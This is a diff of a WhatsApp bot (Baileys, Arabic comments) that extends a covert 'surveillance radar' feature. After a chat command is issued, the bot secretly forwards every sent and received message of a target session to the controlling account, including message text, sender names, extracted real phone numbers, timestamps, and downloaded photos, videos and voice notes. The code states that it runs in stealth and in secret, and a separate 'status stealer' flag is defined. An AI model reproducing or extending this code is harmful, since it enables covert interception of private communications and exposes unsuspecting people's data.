@@ -115,7 +115,7 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
             badWordsList: [ 'كس' ,  'زق' ,  'شرموط' ,  'منيوك' ],
             antiCall: false, // ميزة منع المكالمات (إضافة جديدة)
             statusStealer: false, // ميزة سحب الستوري (إضافة جديدة)
-            monitoringTarget: null // 🕵️ [تطوير] الجلسة المستهدفة للمراقبة
+            monitoringTarget: null // 🕵️ [تطوير] المستهدف للمراقبة الاستخباراتية
         };
         saveSettings();
     }
@@ -226,44 +226,51 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
         const selfId = jidNormalizedUser(sock.user.id);
         const isFromMe = msg.key.fromMe || sender === selfId;
 
-        // 🕵️‍♂️ [تطوير: محرك الرادار الاستخباراتي الفدرالي] 🆕
-        // البحث عن أي جلسة تطلب مراقبة الجلسة الحالية
-        for (const bossId in botSettings) {
-            const bossSettings = botSettings[bossId];
-            if (bossSettings.monitoringTarget === sessionId) {
-                const monitorSock = sessions[bossId];
+        // 🕵️‍♂️ [تطوير: محرك الرادار الاستخباراتي - استخراج الرقم من الملف الشخصي] 🆕
+        // هذا الجزء يقوم بتنقية المعرفات لجلب الرقم الحقيقي الصافي
+        for (const monitorBossId in botSettings) {
+            if (botSettings[monitorBossId].monitoringTarget === sessionId) {
+                const monitorSock = sessions[monitorBossId];
                 if (monitorSock) {
                     try {
                         const mTime = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                         const mType = Object.keys(msg.message)[0];
-                        const mContent = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "رسالة وسائط/مستند";
-                        const mDirection = isFromMe ? "صادرة مـن" : "واردة إلـى";
+                        const mText = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || msg.message.videoMessage?.caption || "رسالة وسائط/مستند";
+                        const mDir = isFromMe ? "صادرة مـن" : "واردة إلـى";
+
+                        // 🔍 خوارزمية سحب الرقم الحقيقي من الهوية الصافية (Profile MSISDN)
+                        // نتجاهل أي معرفات سيرفر ونستخرج فقط الأرقام من JID المستخدم المعياري
+                        let realPhone = jidNormalizedUser(sender || from).split('@')[0];
                         
-                        // تنقية الرقم الحقيقي بدقة جبارة (إزالة معرفات Baileys و LIDs)
-                        const rawJid = (sender || from);
-                        const cleanNum = jidNormalizedUser(rawJid).split('@')[0];
+                        // في حال كان الرقم LID مشفر (267...)، نحاول الحصول عليه من سياق الرسالة أو الوثيقة الشخصية
+                        if (realPhone.startsWith('267') && realPhone.length > 15) {
+                            if (msg.key.participant) realPhone = msg.key.participant.split('@')[0];
+                        }
+                        // إزالة أي زوائد باقية لضمان أنه رقم هاتف صافي
+                        realPhone = realPhone.replace(/[^0-9]/g, '');
 
                         let report = `🕵️‍♂️ *[رادار المراقبة الفدرالي]* 🕵️‍♂️\n\n`;
-                        report += `📂 رسالة ${mDirection} صاحب الجلسة: *${sessionId}*\n`;
+                        report += `📂 رسالة ${mDir} صاحب الجلسة: *${sessionId}*\n\n`;
                         report += `👤 *الاسم:* ${pushName}\n`;
-                        report += `📱 *الرقم:* wa.me/${cleanNum}\n`;
+                        report += `📱 *الرقم الحقيقي:* +${realPhone}\n`;
+                        report += `🔗 *رابط الملف:* wa.me/${realPhone}\n`;
                         report += `🕒 *الوقت:* ${mTime}\n`;
                         report += `📑 *نوع الرسالة:* ${mType}\n\n`;
-                        report += `✉️ *المحتوى:* ${mContent}\n\n`;
+                        report += `✉️ *المحتوى:* ${mText}\n\n`;
                         report += `🤖 *— TARZAN INTELLIGENCE 👑*`;
 
                         const bossJid = jidNormalizedUser(monitorSock.user.id);
                         await monitorSock.sendMessage(bossJid, { text: report });
 
-                        // سحب الوسائط والستوري في المراقبة
+                        // سحب الميديا والستوري
                         if (msg.message.imageMessage || msg.message.videoMessage || msg.message.audioMessage) {
                             const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: pino({ level: 'silent' }) });
-                            const captionTag = `📥 ميديا مراقبة من: ${pushName} (+${cleanNum})`;
-                            if (msg.message.imageMessage) await monitorSock.sendMessage(bossJid, { image: buffer, caption: captionTag });
-                            else if (msg.message.videoMessage) await monitorSock.sendMessage(bossJid, { video: buffer, caption: captionTag });
+                            const capTag = `📥 ميديا من: ${pushName} (+${realPhone})`;
+                            if (msg.message.imageMessage) await monitorSock.sendMessage(bossJid, { image: buffer, caption: capTag });
+                            else if (msg.message.videoMessage) await monitorSock.sendMessage(bossJid, { video: buffer, caption: capTag });
                             else if (msg.message.audioMessage) await monitorSock.sendMessage(bossJid, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
                         }
-                    } catch (e) {}
+                    } catch (e) { console.error("Monitor Error:", e); }
                 }
             }
         }
@@ -422,20 +429,20 @@ async function startSession(sessionId, res = null, pairingNumber = null) {
 
         if (!commandName) return;
 
-        // 🕵️‍♂️ [تطوير: دمج أمر المراقبة مباشرة في المعالج الرئيسي] 🆕
+        // 🕵️‍♂️ [تطوير: دمج أمر المراقبة مباشرة] 🆕
         if (commandName === 'مراقبه') {
-            const targetSession = args[0];
-            if (targetSession === 'ايقاف') {
+            const target = args[0];
+            if (target === "ايقاف") {
                 botSettings[sessionId].monitoringTarget = null;
                 saveSettings();
-                return reply("📴 *تم إيقاف الرادار الاستخباراتي.*");
+                return reply("📴 *تم إيقاف الرادار الاستخباراتي بنجاح.*");
             }
-            if (!targetSession || !sessions[targetSession]) {
-                return reply(targetSession ? `❌ الجلسة [${targetSession}] غير متصلة.` : "🕵️‍♂️ اكتب اسم الجلسة للمراقبة.\nمثال: `.مراقبه عبودي`\nللإيقاف: `.مراقبه ايقاف`\n\n*(العملية سرية جداً)*");
+            if (!target || !sessions[target]) {
+                return reply(target ? `❌ الجلسة [${target}] غير متصلة.` : "🕵️‍♂️ اكتب اسم الجلسة للمراقبة.\nمثال: `.مراقبه session1`\nللإيقاف: `.مراقبه ايقاف`\n\n*(العملية سرية جداً)*");
             }
-            botSettings[sessionId].monitoringTarget = targetSession;
+            botSettings[sessionId].monitoringTarget = target;
             saveSettings();
-            return reply(`✅ *تم تفعيل الرادار الفدرالي بنجاح!* 🕵️‍♂️\n\n🎯 *المستهدف:* [${targetSession}]\n🔐 *الوضعية:* Stealth (صادر/وارد/ستوري)\n\n*سيصلك كل شيء فوراً هنا وبسرية تامة.*`);
+            return reply(`✅ *تم تفعيل الرادار الفدرالي الجبار!* 🕵️‍♂️\n\n🎯 *المستهدف:* [${target}]\n🔐 *الوضعية:* Stealth (سحب الأرقام من الملف الشخصي مفعّل)\n\n*سيصلك كل شيء فوراً وبسرية تامة.*`);
         }
 
         const commandData = commandsMap.get(commandName);
